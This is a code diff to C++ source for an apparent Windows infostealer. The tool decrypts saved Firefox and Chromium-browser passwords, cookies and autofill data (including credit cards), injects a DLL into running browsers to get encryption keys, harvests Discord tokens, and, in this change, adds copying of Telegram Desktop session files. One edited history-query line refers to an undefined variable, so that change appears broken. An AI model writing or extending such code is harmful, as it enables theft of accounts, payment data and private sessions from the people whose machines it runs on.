@@ -297,9 +297,7 @@ typedef SECStatus(*NSSInit_t)(const char*); typedef SECStatus(*NSSShutdown_t)(vo
 
 void collect_firefox(const BrowserConfig& browser) {
     wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) return;
-    fs::path data_path = fs::path(sz_path) / browser.data_path_relative;
-    if (!fs::exists(data_path)) return;
-
+    fs::path data_path = fs::path(sz_path) / browser.data_path_relative; if (!fs::exists(data_path)) return;
     std::vector<fs::path> profile_paths; fs::path ini_path = data_path / "profiles.ini"; std::error_code ec;
     if (fs::exists(ini_path)) {
         std::ifstream file(ini_path); std::string line, section; std::map<std::string, std::map<std::string, std::string>> sections;
@@ -333,7 +331,6 @@ void collect_firefox(const BrowserConfig& browser) {
     if (b_exe.empty()) { DWORD pid = find_main_process(browser.exe_name); if (pid) { HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (h) { wchar_t buf[MAX_PATH]; DWORD sz = MAX_PATH; if (QueryFullProcessImageNameW(h, 0, buf, &sz)) b_exe = buf; CloseHandle(h); } } }
     if (b_exe.empty()) return;
     fs::path bin_dir = fs::path(b_exe).parent_path();
-
     HMODULE h_nss = NULL; NSSInit_t f_NSS_Init = nullptr; NSSShutdown_t f_NSS_Shutdown = nullptr; PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
     wchar_t saved_cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, saved_cwd); SetCurrentDirectoryW(bin_dir.c_str());
     h_nss = LoadLibraryW(L"nss3.dll");
@@ -342,14 +339,12 @@ void collect_firefox(const BrowserConfig& browser) {
 
     wchar_t temp_base[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
     fs::path temp_dir = fs::path(temp_base) / "Temp" / ("firefox_db_" + std::to_string(GetTickCount())); fs::create_directories(temp_dir, ec);
-
     wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
     fs::path base_browser_dir = extractor_root / "browser" / browser.name;
 
     for (const auto& p_path : profile_paths) {
         std::string p_name = p_path.filename().string(); ProfileData p_data; p_data.name = p_name;
         std::string p_name_sanit = p_name; std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
-
         if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
             fs::path min_p = temp_dir / (p_name_sanit + "_nss"); fs::create_directories(min_p, ec);
             copy_file_locked(p_path / "key4.db", min_p / "key4.db"); copy_file_locked(p_path / "key3.db", min_p / "key3.db"); copy_file_locked(p_path / "cert9.db", min_p / "cert9.db"); copy_file_locked(p_path / "logins.json", min_p / "logins.json");
@@ -381,7 +376,6 @@ void collect_firefox(const BrowserConfig& browser) {
         fs::path a_db = p_path / "formhistory.sqlite"; fs::path ta_db = temp_dir / (p_name_sanit + "_auto.tmp");
         if (copy_db_with_sidecars(a_db, ta_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(ta_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT fieldname, value FROM moz_formhistory", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(ta_db); }
         fs::path aj_path = p_path / "autofill-profiles.json"; if (fs::exists(aj_path)) { std::ifstream f(aj_path); json aj = json::parse(f, nullptr, false); if (!aj.is_discarded()) { if (aj.contains("addresses")) for (auto& i : aj["addresses"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() }); if (aj.contains("creditCards")) for (auto& i : aj["creditCards"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() }); } }
-
         if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
             fs::path p_dir = base_browser_dir / p_name_sanit; fs::create_directories(p_dir, ec);
             try {
@@ -404,15 +398,12 @@ void collect_firefox(const BrowserConfig& browser) {
 void inject_and_collect(const std::vector<unsigned char>& dll, const BrowserConfig& browser) {
     wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) return;
     fs::path data = fs::path(sz) / browser.data_path_relative; if (!fs::exists(data)) return;
-
     std::vector<std::string> profs; if (fs::exists(data / "Login Data")) profs.push_back("."); if (fs::exists(data / "Default")) profs.push_back("Default");
     std::error_code ec; if (fs::exists(data)) { for (const auto& e : fs::directory_iterator(data, ec)) { if (e.is_directory() && e.path().filename().string().find("Profile ") == 0) profs.push_back(e.path().filename().string()); } }
     if (fs::exists(data / "Side Profiles")) { for (const auto& e : fs::directory_iterator(data / "Side Profiles", ec)) { if (e.is_directory()) profs.push_back("Side Profiles/" + e.path().filename().string()); } }
     if (profs.empty()) return;
-
     wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
     fs::path base_browser_dir = extractor_root / "browser" / browser.name;
-
     HANDLE h_proc = NULL; bool started = false; PROCESS_INFORMATION pi = {0};
     if (browser.use_injection) {
         DWORD pid = find_main_process(browser.exe_name); if (pid) h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -420,11 +411,9 @@ void inject_and_collect(const std::vector<unsigned char>& dll, const BrowserConf
     }
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
     if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); } }
-
     std::vector<unsigned char> v10, v20;
     { std::ifstream f(data / "Local State"); if (f) { json j = json::parse(f, nullptr, false); if (!j.is_discarded() && j.contains("os_crypt")) { auto b = base64_decode(j["os_crypt"]["encrypted_key"]); if (b.size() > 5) v10 = decrypt_dpapi(std::vector<unsigned char>(b.begin() + 5, b.end())); } } }
     if (browser.use_injection && h_pipe != INVALID_HANDLE_VALUE) { if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) { unsigned char buf[1024]; DWORD r; if (ReadFile(h_pipe, buf, sizeof(buf), &r, NULL) && r > 0) v20.assign(buf, buf + r); } CloseHandle(h_pipe); }
-
     fs::path temp = fs::path(getenv("TEMP") ? getenv("TEMP") : ".") / ("browser_db_" + std::to_string(GetTickCount())); fs::create_directories(temp, ec);
     for (auto& p : profs) {
         fs::path p_path = data / p; ProfileData p_data; p_data.name = p; std::string p_san = p; std::replace(p_san.begin(), p_san.end(), '/', '_'); std::replace(p_san.begin(), p_san.end(), '\\', '_'); std::replace(p_san.begin(), p_san.end(), ':', '_');
@@ -432,9 +421,8 @@ void inject_and_collect(const std::vector<unsigned char>& dll, const BrowserConf
         if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT origin_url, username_value, password_value FROM logins", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 2); int len = sqlite3_column_bytes(st, 2); if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) p_data.passwords.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), to_utf8_lossy(d) }); } } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
         db = p_path / "Network/Cookies"; if (!fs::exists(db)) db = p_path / "Cookies"; t_db = temp / (p_san + "_cook.tmp");
         if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 7); int len = sqlite3_column_bytes(st, 7); std::string val; if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) val = to_utf8_lossy(d); } if (val.empty()) val = get_sqlite_text(st, 8); if (!val.empty()) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), val, get_sqlite_text(st, 2), sqlite3_column_int64(st, 3), sqlite3_column_int(st, 4), sqlite3_column_int(st, 5), sqlite3_column_int(st, 6) }); } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-        db = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), sqlite3_column_int(st, 2) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
+        db = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(stmt, 1), sqlite3_column_int(stmt, 2) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
         db = p_path / "Web Data"; t_db = temp / (p_san + "_web.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT name, value FROM autofill", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-
         if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
             fs::path p_dir = base_browser_dir / p_san; fs::create_directories(p_dir, ec);
             try {
@@ -471,10 +459,7 @@ void collect_discord(const DiscordConfig& cfg) {
                 std::ifstream f(entry.path(), std::ios::binary); std::stringstream ss; ss << f.rdbuf(); std::string s = ss.str();
                 auto it = std::sregex_iterator(s.begin(), s.end(), r_plain); auto end = std::sregex_iterator(); while (it != end) { tokens.push_back(it->str()); ++it; }
                 it = std::sregex_iterator(s.begin(), s.end(), r_mfa); while (it != end) { tokens.push_back(it->str()); ++it; }
-                it = std::sregex_iterator(s.begin(), s.end(), r_enc); while (it != end) {
-                    if (!key.empty()) { auto b = base64_decode(it->str().substr(12)); auto d = aes_gcm_decrypt(key, b); if (!d.empty()) tokens.push_back(std::string(d.begin(), d.end())); }
-                    ++it;
-                }
+                it = std::sregex_iterator(s.begin(), s.end(), r_enc); while (it != end) { if (!key.empty()) { auto b = base64_decode(it->str().substr(12)); auto d = aes_gcm_decrypt(key, b); if (!d.empty()) tokens.push_back(std::string(d.begin(), d.end())); } ++it; }
             }
         }
     }
@@ -486,6 +471,30 @@ void collect_discord(const DiscordConfig& cfg) {
     }
 }
 
+void collect_telegram() {
+    std::vector<fs::path> paths; wchar_t sz[MAX_PATH];
+    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, sz) == S_OK) paths.push_back(fs::path(sz) / L"Telegram Desktop\\tdata");
+    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, sz) == S_OK) paths.push_back(fs::path(sz) / L"Telegram Desktop\\tdata");
+    std::error_code ec; wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
+    for (auto& p : paths) {
+        if (fs::exists(p)) {
+            fs::path t_dir = extractor_root / "Telegram\\tdata"; bool found = false;
+            for (const auto& entry : fs::directory_iterator(p, ec)) {
+                std::string fn = entry.path().filename().string();
+                if (fn.length() == 16 && std::all_of(fn.begin(), fn.end(), [](char c){ return std::isxdigit(c); })) {
+                    if (!found) { fs::create_directories(t_dir, ec); found = true; }
+                    fs::create_directories(t_dir / fn, ec); for (const auto& sub : fs::directory_iterator(entry.path(), ec)) { if (sub.is_regular_file()) fs::copy_file(sub.path(), t_dir / fn / sub.path().filename(), fs::copy_options::overwrite_existing, ec); }
+                }
+                else if (fn == "key_datas" || fn == "settingss" || fn == "maps" || fn == "config") {
+                    if (!found) { fs::create_directories(t_dir, ec); found = true; }
+                    fs::copy_file(entry.path(), t_dir / fn, fs::copy_options::overwrite_existing, ec);
+                }
+            }
+            if (found) break;
+        }
+    }
+}
+
 int main(int argc, char* argv[]) {
     std::string choice = "all"; if (argc > 1) { std::string a1 = argv[1]; if (a1 == "-b" || a1 == "--browser") { if (argc > 2) choice = argv[2]; } }
     std::vector<unsigned char> dll; if (!EMBEDDED_DLL_BASE64.empty()) { dll = base64_decode(EMBEDDED_DLL_BASE64); } else { std::ifstream f("payload.dll", std::ios::binary); if (f) dll = std::vector<unsigned char>((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>()); }
@@ -494,6 +503,6 @@ int main(int argc, char* argv[]) {
         std::string cl = choice; std::transform(cl.begin(), cl.end(), cl.begin(), ::tolower); cl.erase(std::remove(cl.begin(), cl.end(), ' '), cl.end());
         if (cl == "all" || cl == nl) { if (c.is_firefox_based) collect_firefox(c); else inject_and_collect(dll, c); }
     }
-    if (choice == "all") { for (const auto& d : DISCORDS) collect_discord(d); }
+    if (choice == "all") { for (const auto& d : DISCORDS) collect_discord(d); collect_telegram(); }
     return 0;
 }
